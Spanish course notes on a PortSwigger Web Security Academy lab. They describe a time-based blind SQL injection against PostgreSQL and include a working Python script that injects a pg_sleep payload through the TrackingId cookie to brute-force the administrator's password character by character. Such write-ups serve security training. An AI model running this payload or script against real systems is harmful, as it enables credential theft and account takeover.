En esta clase damos continuidad al proceso de explotación visto anteriormente, en el que empleamos una inyección SQL ciega con retardos temporales (**pg_sleep**) para filtrar información sensible sin respuestas visibles del servidor.

Partimos desde el punto en el que ya conocemos la longitud de la contraseña del usuario ‘**administrator**‘. Ahora nos centramos en automatizar por completo la recuperación del valor de cada carácter que la compone, utilizando Burp Intruder para iterar de forma sistemática por todas las posiciones y valores posibles (letras minúsculas y números).

Se configura un ataque por cada posición de la contraseña, adaptando la consulta con ‘**SUBSTRING(password, n, 1)**‘ y analizando el retardo en la respuesta para identificar el carácter correcto. Cada vez que se produce una demora significativa (≈10 segundos), se confirma que el carácter probado es el correcto.

Repetimos el proceso hasta reconstruir completamente la contraseña, cerrando el ejercicio con el acceso exitoso a la cuenta del administrador.

Script
![Pasted_image_20250704124641.png](Imagenes/Pasted_image_20250704124641.png)
![Pasted_image_20250704125451.png](Imagenes/Pasted_image_20250704125451.png)
Script

#!/usr/bin/env python3 
from pwn import *
from termcolor import colored

import requests
import signal
import sys
import string

def def_handler(sig, frame):
    p1.failure("Ataque de fuerza bruta detenido") 
    print(colored(f"\n[!] Saliendo...\n", 'red')) 
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

characters = string.ascii_lowercase + string.digits 
p1 = log.progress("SQLI")

def makeSQLI():

    password = ""

    p1.status("Iniciando ataque de fuerza bruta") 
    time.sleep(2)

    p2 = log.progress("Password")

    for position in range(1, 21):
        for character in characters:
            cookies = {
                'TrackingId': f"test'%3b select case when(username='administrator' and substring(password, {position},1)='{character}') then pg_sleep(3) else pg_sleep(0) end from users-- -",
                'session': "0Vj8dxoJmIzQF8MyDtjXuHORoz7NTXNZ"
            }

            p1.status(cookies["TrackingId"])

            time_start = time.time()

            r = requests.get("https://0a3e00d004218e53801a35c3000300be.web-security-academy.net", cookies=cookies)
            
            time_end = time.time()

            if time_end - time_start > 3:
                password += character
                p2.status(password)
                break

if __name__ == '__main__':

    makeSQLI()

![Pasted_image_20250704131955.png](Imagenes/Pasted_image_20250704131955.png)
En mysql
![Pasted_image_20250704132254.png](Imagenes/Pasted_image_20250704132254.png)
